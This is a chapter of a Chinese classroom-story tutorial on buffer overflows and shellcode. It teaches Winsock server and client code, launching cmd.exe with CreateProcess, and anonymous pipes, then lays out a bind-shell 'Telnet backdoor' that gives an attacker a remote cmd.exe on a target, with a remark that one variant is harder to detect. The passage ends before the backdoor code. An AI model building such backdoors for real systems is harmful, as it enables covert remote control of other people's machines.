# 第三章、后门的编写和 ShellCode 的提取

新的一周开始了，又到了上课时间。

“唉，足球又输了。”老师一进教室就说。

“什么比赛，打谁啊？几比几？”女生们不解的问道。

“世界杯小组预选赛，客场打科威特 0 比 1 输了”。老师把包往凳子上一扔，懒懒的说。

“哎哟，科威特都打不过啊……还记得亚洲杯 3 比 1 输给了日本队呢！”

“是啊，这下小组能否出线还是个问题！我从 94 年甲 A 开始就开始看球了，结果越看越没意思。”老师边准备上课边说，“到现在，任何国内比赛都不看了，最多看看国家队的比赛。”

“国内的球队，还是要支持吧？”一个女生说道。

“别提了，当年成都保卫战时，凌晨就要排队买票；虽然成绩不理想，但大家还是一如既往的支持。”宇强也说道，“但现在……主要是一些东西太让人失望了。”

“是啊，希望我不要让你们失望啊！呵呵！”老师开玩笑的说。

“那里，那里，怎么会哦！”大家说，“但老师要把技术全盘托出哦！”

“呵呵，我全盘托出倒没问题，大家可要加油学习啊！”老师说道。

“当然，我们也不会让老师失望的。”

“呵呵，刚才是给大家鼓鼓气！今天我们会进入真正 ShellCode 的编写！”老师恢复了上课状态，“ShellCode 是完成功能的代码，现实中的 ShellCode 有很多种，一是因为我们想要的功能很多；二是由于即使完成一种功能，也有很多不同的实现，它们各有优劣，不能说谁好谁坏。”

“哦！一般的 ShellCode 都有哪些功能呢？”古风问道。

“ShellCode 的功能很多，常见的一些是开一个本地端口、反连攻击机、下载一个文件并执行、传输一个文件并执行等。”

“哦，这么多啊！”

“呵呵，还有更高级的功能呢，比如直接监听、直接重用端口、恢复堆链表、直接找出已有的 Socket 来使用等。”

“啊？”同学们都听得一愣一愣的。

“不要紧，我们一步步的来学习。记住我们的宗旨是……”

没有蛀牙。”玉波一口答道。

“哐噹……”台上台下倒成一片。

老师好不容易缓过气来，对着胖胖的玉波说道：“我们要记住的是——掌握学习方法，而不是技术本身！”

“哦，对啊，对啊！”玉波乐着说。

# 3.1 预备知识

## 3.1 预备知识

“好，今天我们实现一个开端口的 ShellCode，―个真正的 ShellCode。此 ShellCode 的功能是在对方机器上用某个端口开一个 Telnet 服务器，然后等待远程机器来连接。当远程机器连接上之后，为其开创一个 cmd.exe，把远程机器的输入输出和 cmd.exe 的输入输出联系起来。这样，远程使用者就有了一个远程 Shell。”

“好啊！”虽然还不大懂，但又有东西学了，大家都很高兴。

“这里比以前要麻烦些，有网络编程、进程通信、管道等各方面，我们一个个的来解决。大家可要有耐心啊！”

“好哩！”

# 3.1.1 IP 和 Socket 编程初步

### 3.1.1 IP 和 Socket 编程初步

“我们的 ShellCode 的功能是完成网络的远程连接，那自然会涉及到网络通信。网络通信有好几种实现方法，这里我们使用 Windows Socket 编程。”

小知识：Windows 下网络通信编程的几种方式

第一种是基于 NetBIOS 的网络编程，这种方法在小型局域网环境下的实时通信有很高的效率；

第二种是基于 Winsock 的网络编程；这种方法使用一套简单的 Windows API 函数来实现应用层上的编程；

第三种是直接网络编程；比如 Winpcap、libnet 等网络数据包构造技术可以完成链路层或网络层上的网络编程；

第四种是基于物理设备的网络编程，即 MAC 层编程接口。

“Socket 是什么？有什么用处呢？”玉波问道。

“和 IP 作类比吧。在国际互联网 Internet 上，有成千百万台主机，为了区分这些主机，人们给每台机器都分配了一个专门的‘地址’作为标识，这就是 IP 地址。IP 地址就像是计算机在网上的身份证，通过它才能确定网上不同的机器，大家才能互相通信。”

小知识：

Internet IP 地址由 Inter NIC（Internet 网络信息中心）统一负责全球地址的规划、管理。通常，每个国家需成立一个组织统一向有关国际组织申请 IP 地址，然后再分配给客户。

IP 地址分为 A、B、C、D 和 E 类。IP 地址通常以圆点为分隔号的 4 个十进制数字表示，每个数字对应于 8 个二进制的比特串，如某一台主机的 IP 地址表示格式为： 128.20.4.1 。

“我们要看自己机器上的 IP 很方便。”老师接着说，“一种方法是在‘网上邻居’上点击鼠标右键，在弹出菜单中选择‘属性’；然后在‘本地连接’图标上点击右键，选择‘属性’，选中‘Internet 协议(TCP/IP)’并双击；就可看到图 3－1 所示的窗口。”

![](img/Q 版缓冲区溢出教程 66275.jpg)

“可以看到，这台机器的 IP 是 211.83.154.20，但如果是通过 DHCP 服务器自动获得 IP 地址，那这种方法就不行了。”老师换了一台机器进行演示，“看，不会在这里显示出 IP 地址，如图 3－2。”

![](img/Q 版缓冲区溢出教程 66375.jpg)

“这个时候，我们就要用另一种方法了。点击‘开始’→‘运行’，输入‘cmd’并确定，在命令行下输入 ipconfig 就可看到 IP，如图 3－3，IP 是 10.4.4.79。”

![](img/Q 版缓冲区溢出教程 66464.jpg)

小知识：IP 地址危机和 NAT 转换

最初设计 IP 协议时，设计者没有料到网络会如此的高速发展，现在 IP 地址正迅速的枯竭，如果没有 IP 地址，主机或者移动通信设备在网络上就没有唯一的身份识别，也就不能发送或接收数据了。

有两种解决办法。一是使用新一代的 IP 协议——IPv6，IPv6 采用 128 位数字，所以地址的范围可以看作是无限的；另一种是使用 NAT（Network Address Translation）——网络地址转换，允许内部网络上的多台 PC（使用内部地址段，如 10.0.x.x、192.168.x.x、172.x.x.x）共享单个、全局路由的 IPv4 地址，这在一定程度上缓解了 IP 地址不足的问题。

“这下大家对 IP 地址没什么问题了吧。”老师问道。

“嗯，清楚了。”

“好，然后我们来看看 Socket 吧！虽然 IP 可以唯一的区分网络上的每台主机，但每台主机可能同时和多台机器通信，有可能某个软件就和多台机器通信，比如大家常用的 QQ、IE 浏览器。”

“所以仅仅依靠 IP 地址是无法区分一台机器的所有通信的。”老师继续说道，“为了解决这个问题，就引入了 Socket（中文名称是套接字）。”

“对每一个通信，除了 IP 地址外，还用一个标识符 Socket 来标明每个通信程序（进程）。示意图如图 3－4。”

![](img/Q 版缓冲区溢出教程 67027.jpg)

“打个比方，我有一把钥匙，可以打开某个房间里的一把锁，但仅仅知道房间号还不够，还需要知道是具体那把锁。”

“如果把多个房间看成是多台计算机，那房间号就相当于 IP 地址，钥匙是数据，锁就是程序。数据和程序要通信，就像钥匙要找到所属的锁，仅凭所在的房间号是不够的。”

老师喝了一口水，继续说道：“所以我们可以在钥匙上贴一个标签，注明是哪个房间、哪把锁的钥匙。就像通信中的 Socket，作为计算机通信的标记，标明通信是哪台机器的哪个程序的。这样就可准确分别出通信双方了。”

“哦，这样啊！”大家一下就明白了。

“套接字 Socket 在网络通信中非常重要，当年可是加利福尼亚大学伯克利分校（Berkeley）耗费了大量精力才设计出来的，所以也称为 Berkeley 套接字。”

“哦，那以后我也设计个吃的东西，拿我的名字命名。”玉波满怀信心的说。

“不用设计什么了。他高傲，但宅心人厚；他谦虚，但受万人敬仰！他就是来自天堂的使者、地狱的恶魔——食神玉波！”

“哈哈哈哈……”大家狂笑了起来。

“好了，”老师说道，“我相信在座的各位在不久之后一定会有所建树的，出名之后，可不要忘了我啊！”

“哈哈哈哈……”大家又大笑了起来，眼泪都快出来了。

“OK！玩笑开够了，我们继续，”课堂稍微安静后老师说道，“通过伯克利的成果，我们使用 Socket 实现网络通信编程就非常方便了。Socket 其实就是一个整数，它标识了计算机上不同的通信端点。程序在通信前首先建立一个套接字，以后对设置 IP、端口和传输数据，都通过此套接字来进行。”

小知识：端口 port

是指 TCP/IP 协议中规定的端口，范围从 0 到 65535。它可以标志某种服务，比如网页服务器一般是 80 端口，FTP 服务器一般是 21 端口；在客户端连接中，也需要一个端口来通信，一般是比较高的动态端口号。

“大家理解了套接字 Socket 的概念，是不是想实际使用一下呢？”老师问道。

“是啊！想看看到底是怎样编程的。”

“好！使用 Socket 在两台计算机上实现通信，其实是件简单的事。首先我们看通信的流程。”

“通信双方一定有一台是服务端，一台是客户端。服务端首先启动，建立一个套接字 Socket，并对相应的 IP 和端口进行绑定、监听；客户端也建立一个套接字，和服务端不同，它直接连接服务端监听的端口。双方建立连接后，服务端和客户端就可以互相传输数据了，当然都是通过 Socket 来完成的。”

“其工作流程图如 3－5。”

![](img/Q 版缓冲区溢出教程 68077.jpg)

“对图中的那些函数，我这里稍加解释一下。”

```
int  WSAStartup(WORD wVersionRequested, LPWSADATA  lpWSAData); 
```

功能是初始化 Windows Socket Dll，在 Windows 下必须使用它。

参数：

“wVersionRequested”表示版本，可以是 1.1、2.2 等；

“lpWSAData”指向 WSADATA 数据结构的指针。

```
int socket(int family, int type, int protocol); 
```

功能是建立 Socket，返回以后会用到的 Socket 值。如果错误，返回－1。

参数：

“int family”参数指定所要使用的通信协议，取以下几个值：AF_UNIX（Unix 内部协议）、AF_INET（Internet 协议）、AF_NS Xerox（NS 协议）、AF_IMPLINK（IMP 连接层），在 Windows 下只能把“AF”设为“AF_INET”；

“int type”参数指定套接字的类型，取以下几个值：SOCK_STREAM（流套接字）、SOCK_DGRAM （数据报套接字）、SOCK_RAW（未加工套接字）、SOCK_SEQPACKET（顺序包套接字）；

“int protocol”参数通常设置为 0。

```
int bind(int sockfd, struct sockaddr *my_addr, int addrlen); 
```

功能是把套接字和机器上一定的端口关联起来。

参数：

“sockfd”是调用 socket()返回的套接字值；

“my_addr”是指向数据结构 struct sockaddr 的指针，它保存你的地址，即端口和 IP 地址信息；

“addrlen”设置为 sizeof(struct sockaddr)。

```
int listen(int sockfd, int backlog); 
```

功能是服务端监听一个端口，直到 accept()。在发生错误时返回-1。

参数：

“sockfd”是调用 socket()返回的套接字值；

“backlog”是允许的连接数目。大多数系统的允许数目是 20，也可以设置为 5 到 10。

```
int connect(int sockfd, struct sockaddr *serv_addr, int addrlen); 
```

功能是客户端连接服务端监听的端口。

参数：

“sockfd”是调用 socket()返回的套接字值；

“serv_addr”保存着目的地端口和 IP 地址的数据结构 struct sockaddr；

“addrlen”设置为 sizeof(struct sockaddr)。

```
int accept(int sockfd, void *addr, int *addrlen); 
```

功能是服务端接受客户端的连接请求，并返回一个新的套接字，以后服务端的数据传输就使用这个新的套接字。如果有错误，返回-1。

参数：

“sockfd”是和 listen()中一样的套接字值；

“addr”是个指向局部的数据结构 sockaddr_in 的指针；

“addrlen”设置为 sizeof(struct sockaddr_in)。

```
int send(int sockfd, const void *msg, int len, int flags);
int recv(int sockfd, void *buf, int len, unsigned int flags); 
```

功能是用于流式套接字或数据报套接字的通讯，我们数据的真正传输就由它们完成。

参数：

“sockfd”是发/收数据的套接字值；

“msg”指向你想发送的数据的指针；

“buf”是指向接收数据存放的地址；

“len”是数据的长度；

“flags”设置为 0。

```
int sendto(int sockfd, const void *msg, int len, unsigned int flags,const struct sockaddr *to, int tolen);
int recvfrom(int sockfd, void *buf, int len, unsigned int flags, 　struct sockaddr *from, int *fromlen); 
```

功能和 send、recv 类似，不过是用于无连接数据报套接字的传输。

```
int closesocket（int sockfd） 
```

功能是关闭套接字。

参数“sockfd”为要关闭的套接字值。

“哇！好复杂的函数，好难记啊！”大家嚷道。

“NO，虽然函数有点多，每个函数又有很多参数，但大家完全没有必要去死记（其实也是记不清的）。大家要记的是流程和思路，编程要用具体函数时，查 MSDN 吧！非常详细的开发帮助资料，会找到你要用的。如图 3－6。”

![](img/Q 版缓冲区溢出教程 70150.jpg)

“有了上面的基础，我们一起来看一个具体程序。这个程序比较简单，服务端监听某个端口，如果有客户端连接，就向它发一字符串，客户端收到后，在屏幕上打出来。”

“但我们对编程还不大懂啊！”

“这里的目的是让大家对 Socket 编程有个整体了解。不用怕，程序我会详细解释的，首先是服务端的程序。其流程是：

```
socket()→bind()→listen→accept()→recv()/send()→closesocket() 
```

具体代码如下：”

```
#include <stdio.h>
#include <winsock.h>
#pragma comment(lib,"Ws2_32")
#define MYPORT 830  /*定义用户连接端口*/ 
#define BACKLOG 10  /*多少等待连接控制*/ 
int main() 
{
         int sockfd, new_fd;                                  /*定义套接字*/
         struct sockaddr_in my_addr;          /*本地地址信息 */ 
         struct sockaddr_in their_addr;        /*连接者地址信息*/ 
         int sin_size;
         WSADATA ws;
         WSAStartup(MAKEWORD(2,2),&ws);           //初始化 Windows Socket Dll
          //建立 socket
         if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
         { 
                   //如果建立 socket 失败，退出程序
                   printf("socket error\n"); 
                   exit(1); 
         } 
         //bind 本机的 MYPORT 端口
         my_addr.sin_family = AF_INET;                     /* 协议类型是 INET  */ 
         my_addr.sin_port = htons(MYPORT);            /* 绑定 MYPORT 端口*/ 
         my_addr.sin_addr.s_addr = INADDR_ANY;   /* 本机 IP*/ 
         if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr))== -1)
         { 
                   //bind 失败，退出程序
                   printf("bind error\n"); 
                   closesocket(sockfd);
                   exit(1); 
         }
         //listen，监听端口
         if (listen(sockfd, BACKLOG) == -1)
         { 
                   //listen 失败，退出程序
                   printf("listen error\n"); 
                   closesocket(sockfd);
                   exit(1); 
         } 
         printf("listen...");
         //等待客户端连接
         sin_size = sizeof(struct sockaddr_in); 
         if ((new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1)
         { 
                   printf("accept error\n"); 
                   closesocket(sockfd);
                   exit(1);
         } 
         printf("\naccept!\n");
         //有连接，发送 ww0830 字符串过去
         if (send(new_fd, "ww0830\n", 14, 0) == -1) 
         {
                   printf("send error");
                   closesocket(sockfd);
                   closesocket(new_fd); 
                   exit(1); 
         } 
         printf("send ok!\n");
         //成功，关闭套接字
         closesocket(sockfd);
         closesocket(new_fd);
         return 0;
} 
```

老师说：“程序看起来比较长，是因为加了许多错误处理。如果去掉他们，就可以看出程序的本质。我再重复一遍，流程如下：”

对服务端程序的流程概括：

先是初始化 Windows Socket Dll： `WSAStartup(MAKEWORD(2,2),&ws);`

然后建立 Socket： `sockfd = socket(AF_INET, SOCK_STREAM, 0)`

再 bind 本机的 MYPORT 端口：

```
my_addr.sin_family = AF_INET;         /* 协议类型是 INET   */ 
my_addr.sin_port = htons(MYPORT);       /* 绑定 MYPORT 端口  */ 
my_addr.sin_addr.s_addr = INADDR_ANY;   /* 本机 IP           */ 
bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) 
```

接下来监听端口： `listen(sockfd, BACKLOG)`

如果有客户端的连接请求，接收它： `new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)`

最后发送 ww0830 字符串过去： `send(new_fd, "ww0830\n", 14, 0)`

收尾工作，关闭 socket： `closesocket(sockfd); closesocket(new_fd);` ”

“哦，果然都是对 Socket 的操作。可不可以先看看服务端的效果呢？”大家问道。

“当然可以了，我们把 server.cpp 编译、执行，就会一直监听 830 端口，如图 3－7。”

![](img/Q 版缓冲区溢出教程 73350.jpg)

“测试它能否传输数据吧！在另一台机器上进入命令行界面，输入 telnet 服务器 IP 830 ，我的服务器 IP 是 211.83.154.120，如图 3－8。”

![](img/Q 版缓冲区溢出教程 73432.jpg)

“敲回车，执行效果如图 3－9，客户端成功收到了服务端发的‘ww0830’字符串，并打了出来；服务端也显示传输成功（图 3－10）。”

![](img/Q 版缓冲区溢出教程 73502.jpg)

![](img/Q 版缓冲区溢出教程 73504.jpg)

“乌拉！是啊！”

“刚才使用的 Telnet 是 Windows 系统自带的程序。我们既然可以实现服务端程序，那当然也可以实现客户端程序了。其流程是：

```
socket()→connect()→send()/recv()→closesocket() 
```

比服务端更简单吧！其实现代码如下：”

```
#include <stdio.h>
#include <stdio.h>
#include <winsock.h>
#pragma comment(lib,"Ws2_32")
#define PORT 830                            /* 客户机连接远程主机的端口 */ 
#define MAXDATASIZE 100                     /* 每次可以接收的最大字节 */ 
int main(int argc, char *argv[]) 
{ 
int sockfd, numbytes; 
char buf[MAXDATASIZE]; 
struct sockaddr_in their_addr;        /* 对方的地址端口信息 */ 
if (argc != 2) 
{ 
           //需要有服务端 ip 参数
           fprintf(stderr,"usage: client hostname\n"); 
           exit(1); 
} 
　WSADATA ws;
WSAStartup(MAKEWORD(2,2),&ws);         //初始化 Windows Socket Dll
 if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
{ 
           //如果建立 socket 失败，退出程序
           printf("socket error\n"); 
           exit(1); 
} 
//连接对方
their_addr.sin_family = AF_INET;                         /* 协议类型是 INET  */ 
their_addr.sin_port = htons(PORT);                       /* 连接对方 PORT 端口 */ 
their_addr.sin_addr.s_addr = inet_addr(argv[1]);        /* 连接对方的 IP */ 
if (connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) == -1)
{ 
           //如果连接失败，退出程序
           printf("connet error\n"); 
           closesocket(sockfd); 
           exit(1); 
} 
 //接收数据，并打印出来
if ((numbytes=recv(sockfd, buf, MAXDATASIZE, 0)) == -1) 
{ 
           //接收数据失败，退出程序
           printf("recv error\n"); 
           closesocket(sockfd); 
           exit(1); 
} 
buf[numbytes] = '\0'; 
printf("Received: %s",buf); 
closesocket(sockfd); 
return 0; 
} 
```

“仍然是流程最关键，”老师又强调了一遍，“我们也把脉络提出来过一遍吧！”

对客户端程序的流程概括：

首先是初始化 Windows Socket Dll： `WSAStartup(MAKEWORD(2,2),&ws);`

然后建立 Socket： `sockfd = socket(AF_INET, SOCK_STREAM, 0)`

接着连接服务器方：

```
their_addr.sin_family = AF_INET;                                 /* 协议类型是 INET    */ 
their_addr.sin_port = htons(PORT);                           /* 连接对方 PORT 端口      */ 
their_addr.sin_addr.s_addr = inet_addr(argv[1]);         /* 连接对方的 IP  */ 
connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) 
```

连接成功就接收数据： `recv(sockfd, buf, MAXDATASIZE, 0)`

最后把收到的数据打印出来并关闭套接字：

```
printf("Received: %s",buf);      closesocket(sockfd); 
```

“这个程序的执行要带对方服务器的 IP 地址为参数，所以要这样执行，如图 3－11。”

![](img/Q 版缓冲区溢出教程 75766.jpg)

“我们还是先打开服务端的程序，让它监听端口，再运行客户端的程序去连接它，其效果如图 3－12。”

![](img/Q 版缓冲区溢出教程 75817.jpg)

“哦！又收到服务器发的数据了。”同学们高兴的说。

“我有点明白了！编程就是用一系列的函数完成构思的流程图中的每个部分。”宇强说道，“所以思路才是关键。”

“你总结得很好！”老师赞扬的说：“程序的本质是算法加数据结构。算法就是流程图，数据结构就是定义适当的变量来调用适合的函数。”

“当然，如果作为一个软件，就不局限于此了。软件追求的是满足用户提出的需求，并提供给用户人性化的界面。”

“我们知道了如何编程实现数据在网络上的传输，就可以给目标机发送命令和接收执行的结果了。”

“传输是可以了，但对方的计算机怎样执行我们传过去的命令呢？”宇强问道。

“问得好！这就要涉及到进程通信以及管道了。”

# 3.1.2 进程间通信及管道

### 3.1.2 进程间通信及管道

“再重述一遍我们 Shellcode 的功能：在目标机器开一个 Telnet 服务器，监听某个端口，然后等待攻击机来连接。当攻击机连接之后，为它开创一个 cmd.exe，把攻击机的输入输出和 cmd.exe 的输入输出联系起来。这样，远程攻击者就像 Telnet 一样，有了一个远程 Shell。”

“刚才我们学习了绑定某个端口，接受连接和发送数据的编程实现。接下来我们要：一、开创 cmd.exe 进程；二、把 CMD 进程和客户的输入连起来。”

“先看第一个，为客户开创一个 cmd.exe。可以用 CreateProcess 来创建这个子进程，其原型是：

```
BOOL CreateProcess(
  LPCTSTR lpApplicationName,
  LPTSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
); 
```

“哇！好多参数啊！”台下的眼睛都看大了。

“很多参数都可以不用，直接用 NULL（即空）来代替即可。我们把它的第二个参数设为 cmd.exe /k ，就可以直接创建一个控制台窗口，而且不消失，程序如下：”

```
#include<windows.h>
int main()
{
     PROCESS_INFORMATION ProcessInformation;
     STARTUPINFO si;
     ZeroMemory(&si,sizeof(si));
     CreateProcess(NULL, "cmd.exe /k",NULL, NULL,1,0,NULL, NULL, &si, &ProcessInformation);
     return 0;
} 
```

“主要使用了三个参数，执行效果如图 3－13，开创了一个 CMD 窗口，参数‘/k’使控制台执行并保留下来。”

![](img/Q 版缓冲区溢出教程 77168.jpg)

“哦！好像又是一种开本地控制台窗口的好方法啊！”台下有人说道。

“是啊！你们能意识到就很好！知识就是这样，前后可以融会贯通。”老师说，“现在就剩下把远程攻击机的输入输出和 cmd.exe 的输入输出联系起来了，这就涉及到进程间的通信了。”

小知识：进程间通信（IPC）机制

进程间通信（IPC）机制是指同一台计算机的不同进程之间或网络上不同计算机进程之间的通信。Windows 下的方法包括邮槽（Mailslot）、管道（Pipes）、事件（Events）、文件映射（FileMapping）等。

“在这里，我们使用匿名管道（Anonymous Pipe）来完成这个联系过程。”

“管道？匿名管道？”大家更晕了。

“管道（Pipe）是一种简单的进程间通信（IPC）机制。实际是一段共享内存，在 Windows NT/Win2000/ Win 98/ Win 95 下都可以使用。一个进程向管道写入数据后，另一个进程就可从管道的另一端将其读取出来。”

“管道分有名和匿名两种。命名管道可以在同台机器的不同进程间以及不同机器上的不同进程之间进行双向通信。而匿名管道就要简单多了，只是在父子进程之间或者一个进程的两个子进程之间进行通信，它是单向的。”

“匿名管道实际上是内存中的一个独立的临时存储区，它对数据采用先进先出的方式管理，并严格按顺序操作，不能被搜索。”

“有了管道，我们向其他进程传输数据时就可像对普通文件读写那样简单。管道操作标示符是 HANDLE，也就是说，我们可以直接使用 readFile、WriteFile 来读写，根本不必了解网络间/进程间通信的具体细节。”

老师说了这么多，台下似懂非懂。

“不要紧，等会看看具体的程序就能清楚流程和具体的实现。”老师轻松的说道，“这里先介绍一下相关函数，匿名管道由 CreatePipe（）函数创建。”

CreatePipe（）函数相关知识

CreatePipe（）的函数原型为：

```
BOOL CreatePipe(   PHANDLE hReadPipe,
PHANDLE hWritePipe,
LPSECURITY_ATTRIBUTES lpPipeAttributes,
DWORD nSize ); 
```

功能是创建匿名管道，并返回管道的读句柄和写句柄。

参数：

“hReadPipe”指向返回的读句柄的指针；

“hWritePipe”指向返回的写句柄的指针；

“lpPipeAttributes”指向安全属性的指针；

“nSize”表示管道的大小。

“创建了匿名管道和相应的读写句柄后，我们把写句柄放入一个进程中，读句柄放入另一个进程中，注意这两个进程必须要是父子继承关系，通过设置 CreateProcess（）的 bInheritHandles 为 True 来实现。”

“第一个进程要把数据写入 Pipe，针对写句柄调用 WriteFile 函数即可。WriteFile 函数将数据写入一个文件，成功返回非 0，失败返回 0；”

“另一个进程要读取 Pipe 里的数据时，针对读句柄先调用 PeekNamedPipe 函数，用来确定 Pipe 中是否有数据，然后再调用 ReadFile 函数，将 Pipe 中的数据读出。”

“管道通信的整体流程示意图如图 3－14。”老师在黑板上画了出来。

![](img/Q 版缓冲区溢出教程 78563.jpg)

“哦！”大家一口气听完，感觉还是有点过瘾。

“进程间的通信就是这样的。现在预备知识都有了，大家休息一下，下节课我们把它们结合起来，构造出一个完整的 Telnet 后门程序。”

小知识：Pipe 的共用、建立、写入和读取过程

（ 1 ） Pipe 的共用。 Windows 中的 Pipe 并不是共用资源，2 个进程如果没有“父子“关系，而且子进程又没有继承父进程资源，那么这 2 个进程将无法使用 Pipe 来传递数据。如何让 2 个进程产生父子及继承关系呢？条件是子进程由父进程启动，且在启动子进程时必须设置好继承参数。

上面的条件，通过调用 API 函数 CreateProcess 就可以实现。其中 CreateProcess 函数用来创建新进程，返回值非 0 表示成功，为 0 表示失败。为了让 2 个进程产生父子及继承关系，参数“bInheritHandles”应设置为 True。

（ 2 ） Pipe 的建立。 设置好 Pipe 的共用后，父进程通过调用 API 函数 CreatePipe 来创建 Pipe，之后再将 Pipe 设置成可继承的。其中，CreatePipe 函数用来创建一个匿名管道，返回值为 Long，非 0 表示成功，0 表示失败。

（3）Pipe 的写入和读取　　

Pipe 的写入：要将数据写入 Pipe，调用 WriteFile 函数即可；其中，WriteFile 函数将数据写入一个文件。返回值为 Long，TRUE（非 0）表示成功，否则返回 0。

Pipe 的读取：必须分两步：先调用 PeekNamedPipe 函数，用来确定 Pipe 中是否有数据，以避免数据接收方长时间等待或处于永远等待状态；再调用 ReadFile 函数将 Pipe 中的数据读出。其中，PeekNamedPipe 函数不会把 Pipe 中的数据读走，若 Pipe 中没有数据，它会正常返回，不会长时间等待，但 ReadFile 函数会长时间等待。

通过以上步骤，就可以利用 Pipe 技术来传送数据了。

# 3.2 后门总体思路

## 3.2 后门总体思路

十分钟后，大家又坐好了，老师叮嘱道：“我一直强调：学东西，关键是学思路。有了整体的解决思路，那剩下的东西处理起来就比较方便了，这一点大家千万不要忘记啊！”

“嗯！好的！”同学们齐声答道。

“这里也一样，我们先来理清楚 Telnet 后门实现的总体流程，再来看如何实现。”

老师说：“大家先讨论一下，如何根据刚才的背景知识编写出 Telnet 的后门程序。”

老师接着说：“这次采用分组方式，每两个人一组，先组内讨论，然后每个组把构想的方法公布出来，最后大家再来一起讨论。”

“分组就按名单来分吧！”老师对着花名册念到，“古风和玉波一组；宇强和吴小倩一组……”

宇强的心里一为之动：我名字和吴小倩的名字是挨在一起的么？

分组完毕，大家都忙着找 Partner，并七嘴八舌的讨论起来。宇强也站了起来，走到小倩面前，小心翼翼的问道：“我们是一组的吗？”

“是啊，你是宇强吧，你好！” 小倩对着宇强眨了眨眼睛，大大的眼睛好似一潭平静的湖水。

“你……好！” 宇强反而还有一阵慌乱。

“你坐下啊！”小倩指着旁边的位子说。

“好的，” 宇强的大脑是一片空白，闻到小倩秀发飘过来的清香味，不禁迷糊了，是梦还是现实呢？

“你的思路是什么呢？”一个声音把宇强拉了回来。宇强急忙理理思路，说道：“具体的我还不太清楚，但有一些感觉。”

“哦？什么感觉呢？”

其实，宇强想说是对你有感觉，但觉得未免太唐突和搞笑了，于是说：“老师把技术背景都讲了，我感觉把它们按一定的逻辑组合起来，就可以得到完美的 Tlnet 后门程序。”

“哦，逻辑组合？”小倩感兴趣的说道，“我觉得也有可能是这样。”

“嗯，我们边讨论边写下来吧！ 宇强看到小倩并不讨厌自己，心里又了镇定很多。

“好的，”小倩拿出笔和纸，边说边画，“首先是有攻击机、标机，它们之间可以通过套接字 Socket 通信，如图 3－15。”

![](img/Q 版缓冲区溢出教程 80171.jpg)

“多么隽永的字啊！” 宇强暗想。见小倩要转头问他了，于是忙着补充说：“嗯，然后是一个父进程和子进程，它们之间可以通过管道 pipe 通信。”

“嗯，对，也把它画下来吧！”

“匿名管道是单向的，所以要相互通信必须要建两个匿名管道。” 宇强提醒道。

“哦，对！所以应该是这样，如图 3－16。”

![](img/Q 版缓冲区溢出教程 80323.jpg)

“然后呢？”画好图后，小倩问。

宇强说：“我想应该把两个图合起来。攻击机发的命令通过 Socket 传给目标机的父进程，目标机的父进程又通过一个匿名管道传给子进程，这里的子进程应该是 cmd.exe，cmd.exe 执行命令后，把结果通过另一个匿名管道返给父进程，父进程最后再通过 Socket 返回给攻击机。其示意图应该如图 3－17。”

![](img/Q 版缓冲区溢出教程 80492.jpg)

“哇！思路越来越清楚了！”小倩欢呼到。

“但……”宇强挠挠头，为难的说道，“这个方法可不可行，如何编程实现，我都还不太清楚。”

“能想到这一点，已经非常不错了！”身后一个声音把两人都吓了一跳。两人回头一看，原来老师巡查到这儿来了。

“好了，”老师对着全班同学大声说道，“分组讨论就到这里。大家回到原来的位置上去，我们一起来总结。”

教室里又是一阵忙乱，宇强犹豫的站了起来，鼓气勇气向小倩问道：“嗯，可以问下你的电话吗？”接着忙解释到：“以后有什么问题候好讨论啊！”

“哦！这样啊，我的电话 8541XXXX。”女孩笑了，“应该是我多向你请教才是呢！”

“哪里哪里，互相学习嘛！” 宇强一边客气，一边抑制住住心中的喜悦。

回到位置上，坐一旁的古风问道：“怎么样？有结果么？”

“嗯！一般般吧！” 宇强心不在焉的说，只顾忙着找纸把号码记下来。

“我和玉波讨论的结果是这样的，”古风说道，“我们觉得可行，老师也说可行，Yeah！”

“哦？” 宇强记下了号码，听古风这么一说，兴趣也一下子提了起来，“是什么思路呢？”

古风说：“CreateProcess 可以传参数开进程，像刚才的 cmd /k ，那目标机通过网络收到命令后，就以命令为参数开启一个 CMD 新进程，比如 cmd /c dir ，命令执行完毕后新进程自动消失，结果通过一个匿名管道返回给父进程，父进程由 Socket 传回给攻击机。”

古风拿出他们画的示意图，如图 3－18。

![](img/Q 版缓冲区溢出教程 81119.jpg)

“不错不错！”宇强赞叹道，心里暗想：“我怎么就没有想到呢？”

“那你们的思路呢？”古风说完后问宇强。

宇强正要开口，老师在台上说话了：“大家安静，我们来总结一下。”课堂逐渐安静下来，古风和宇强也停止了说话。

老师说：“刚才我注意了大家的讨论，都很认真，而且也提出了很多不错的思路。同学们大都想出来了，ShellCode 的功能分为主进程和子进程，主进程的功能是网络连接——传输命令和结果；子进程的功能是执行 cmd.exe 命令。”

大家都点点头。

老师继续说：“要把 cmd.exe 的输入输出和主进程联系起来，有两种思路。第一种方法是只用一个匿名管道，有命令数据来，主进程以数据为参数马上新建一个 cmd.exe 进程执行，执行的结果由匿名管道返回。”

宇强悄悄对古风说：“是你们的思路也。”古风咧嘴笑了笑。

“另一种方法是用两个匿名管道，只开一个 cmd.exe 进程。有命令来时，通过一个匿名管道传给 cmd.exe，执行结果通过另一个匿名管道返回给主进程。”

“这就是我们的思路！”宇强兴奋的对古风说。

老师在台上继续总结道：“第一种方法的好处是：来一个命令数据就马上开 cmd.exe 进程执行并退出，所以不会有 CMD 进程出现，不易被发现；而第二种方法的好处是：只创建了一次 cmd.exe 的进程。”

小结：

第一种思路：一个管道。有命令来，则以命令为参数开 CMD 进程，执行结果从管道返回；

第二种思路：两个管道。开创 CMD 进程，命令数据从一个管道中输入，执行结果从另一个管道中返回。

# 3.3 Telnet 后门的高级语言实现

## 3.3 Telnet 后门的高级语言实现

“那怎么编程实现呢？”宇强按捺不住好奇的心情，问道。

“是啊，怎么实现呢？”其他同学也很想知道。

